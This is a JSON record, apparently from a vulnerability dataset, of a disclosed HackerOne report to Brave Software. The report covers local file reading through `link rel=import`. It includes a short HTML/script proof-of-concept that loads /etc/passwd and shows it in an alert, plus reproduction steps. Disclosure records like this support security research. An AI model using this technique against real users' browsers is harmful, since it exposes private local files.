@@ -1,0 +1,38 @@
+{
+    "reported_to": "Brave Software",
+    "reported_by": "metnew ",
+    "title": "Local files reading using `link[rel=\"import\"]`",
+    "content": "\nSummary:\nHTML file could import another file using <link rel=\"import\">. Brave returns Access-Control-Allow-Origin: * response header for local HTML files. That leads to local files reading.\nThis vulnerability makes #369218 critical.\nProducts affected:\nBrave: 0.23.19\nV8: 6.7.288.46\nrev: 178c3fbc045a0cbdbe098db08307503cce952081\nMuon: 7.1.3\nOS Release: 17.6.0\nUpdate Channel: Release\nOS Architecture: x64\nOS Platform: macOS\nNode.js: 7.9.0\nBrave Sync: v1.4.2\nlibchromiumcontent: 67.0.3396.87\nSteps To Reproduce:\nPoC:\nCode 260 Bytes\n1<head>\n2    <script>\n3        function show() {\n4            var file = link.import.querySelector('body')\n5            alert(file.innerHTML)\n6        }\n7    </script>\n8    <link id=\"link\" href=\"file:///etc/passwd\" rel=\"import\" as=\"document\" onload=\"show()\" />\n9</head>\nSupporting Material/References:\nScreencast + PoC attached.\nImpact\nLocal files reading is forbidden in any browser.\nAlso, note that this vulnerability makes #369218 critical.\nProbably all platforms(macOS/Win/Linux) are affected.\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": 400,
+    "weaknesses": [
+        "None"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1538194560,
+    "report_url": "https://hackerone.com/reports/375329",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "HIGH",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create an HTML file with a script that uses `<link rel=\"import\">` to import a local file (e.g., `/etc/passwd`)."
+        ],
+        [
+            2,
+            "Open the HTML file in Brave browser to trigger the import and display the contents of the local file in an alert."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to read local files using the `<link rel=\"import\">` feature in Brave browser due to improper handling of the `Access-Control-Allow-Origin` header for local HTML files.",
+    "reason": "The attack is straightforward and involves a single component (HTML import feature) with no complex interactions or state manipulations. The issue is a misconfiguration in Brave's handling of local file imports.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": "369218"
+}
